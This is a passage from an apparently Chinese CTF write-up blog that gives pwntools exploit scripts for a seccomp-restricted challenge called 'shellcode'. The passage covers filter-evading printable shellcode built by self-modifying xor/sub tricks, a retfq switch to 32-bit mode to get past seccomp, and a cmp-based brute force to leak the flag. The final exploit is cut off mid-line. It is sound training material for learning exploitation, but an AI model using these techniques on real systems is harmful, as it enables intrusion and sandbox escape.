: u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;set exec-wrapper env &#x27;LD_PRELOAD=./libc-2.23.so&#x27;\nrun\nb *$rebase(0xE29)\n&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(challenge)</span></span><br><span class="line">    p = gdb.debug(challenge,c)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,c)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(index) == <span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,index)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(index) == <span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;-14&quot;</span>,<span class="number">0x8</span>,asm(<span class="string">&quot;jmp rdi&quot;</span>))</span><br><span class="line"></span><br><span class="line">shellcode_open = shellcraft.pushstr(<span class="string">&quot;flag&quot;</span>) + shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode_read = shellcraft.read(<span class="string">&quot;rax&quot;</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode_write = shellcraft.write(<span class="number">1</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_open))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_read))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_write))</span><br><span class="line"></span><br><span class="line">shellcode_magic = asm(<span class="string">&quot;xor rax,rax;mov dl,0x80;mov rsi,rbp;push rax;pop rdi;syscall;jmp rbp&quot;</span>)</span><br><span class="line">cmd(shellcode_magic)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode_open+shellcode_read+shellcode_write))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), statically linked, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，要考虑 retfq 切换32位架构绕过 seccomp</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>直接执行 shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size = sys_read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>uLL);</span><br><span class="line">size2 = size;</span><br><span class="line"><span class="keyword">if</span> ( shellcode[(<span class="keyword">int</span>)size - <span class="number">1</span>] == <span class="number">0xA</span> )</span><br><span class="line">&#123;</span><br><span class="line">  shellcode[(<span class="keyword">int</span>)size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  size2 = size - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size2; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( shellcode[i] &lt;= <span class="number">0x1F</span> || shellcode[i] == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br></pre></td></tr></table></figure>
<ul>
<li>现在 shellcode 的范围为 <code>(0x1f,0x7f)</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序对输入的 shellcode 有检查，建议用 nasm 手动编写 shellcode</p>
<p>可以利用 shellcode 创造一个 sys_read 绕过 shellcode 的检查，但在实际构造的过程中遇到了很多问题，最大的问题但就是无法使用 syscall（类似于 mov，add 之类的指令也会被过滤掉）</p>
<p>后来调试网上的 wp 发现了解决的办法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x57],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x58],cl</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x70</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += append</span><br><span class="line">shellcode = asm(shellcode,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>直接输入 syscall 会被检测出来，但通过 <code>xor byte ptr[rax+offset],cl</code> 就可以将后面的二进制代码给计算为 syscall</li>
<li>对于这种会检查 shellcode 的程序来说，破解的关键点就是要利用合适的汇编指令来修改 shellcode 本身</li>
</ul>
<p>利用这个技巧可以获取到 syscall，但由于程序没法泄露，因此先执行 sys_mmap 申请一段固定位置的缓冲区，然后执行 sys_read 将数据写入其中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f6fba0ee031</span>    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x40404040</span></span><br><span class="line">       len: <span class="number">0x7e</span></span><br><span class="line">       prot: <span class="number">0x7</span></span><br><span class="line">       flags: <span class="number">0x22</span></span><br><span class="line">       fd: <span class="number">0x0</span> (pipe:[<span class="number">270462</span>])</span><br><span class="line">       offset: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f6fba0ee057</span>    syscall  &lt;SYS_read&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (pipe:[<span class="number">270462</span>])</span><br><span class="line">       buf: <span class="number">0x40404040</span> ◂— <span class="number">0</span></span><br><span class="line">       nbytes: <span class="number">0x70</span></span><br></pre></td></tr></table></figure>
<p>最后的步骤就是 retfq 切换32位架构来绕过 seccomp 了</p>
<ul>
<li>指令 retfq 有两步操作：pop ip，pop cs（retf 是32位的 pop，retfq 是64位的 pop）<ul>
<li>cs=0x23 程序以32位模式运行</li>
<li>cs=0x33 程序以64位模式运行 </li>
</ul>
</li>
</ul>
<p>只要按照如下方法步骤 shellcode 就可以完成切换：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x72</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push 0x48</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>正常写入的 retfq 指令会被程序过滤，但还是可以通过 <code>sub byte ptr[rax+offset],cl</code> 进行调整</li>
</ul>
<p>在绕过 seccomp 后还是会因为没有 wrire 而打印不出 flag，因此只能通过 cmp 汇编指令来区别内存中的 flag，将 flag 爆破出来（类似于 SCTF-gadget 的思路）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x40026D\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">    push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    push rax /*set r9*/</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /*syscall*/</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string">    push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x49</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x57],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x58],cl</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x70</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x72</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push 0x48</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p,index,ch</span>):</span></span><br><span class="line">    shellcode_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">        mov esp,0x40404140</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        push esp</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        mov eax,5</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ecx,eax</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push 0x33</span></span><br><span class="line"><span class="string">        push 0x40404089</span></span><br><span class="line"><span class="string">        retfq</span></span><br><span class="line"><span class="string">        /*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">        mov rdi,rcx</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x70</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    shellcode += shellcode_mmap</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode += shellcode_read</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode += shellcode_retfq</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode = asm(shellcode,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sl(shellcode)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode_flag+=<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-3;ret&quot;</span>.<span class="built_in">format</span>(index,ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode_flag+=<span 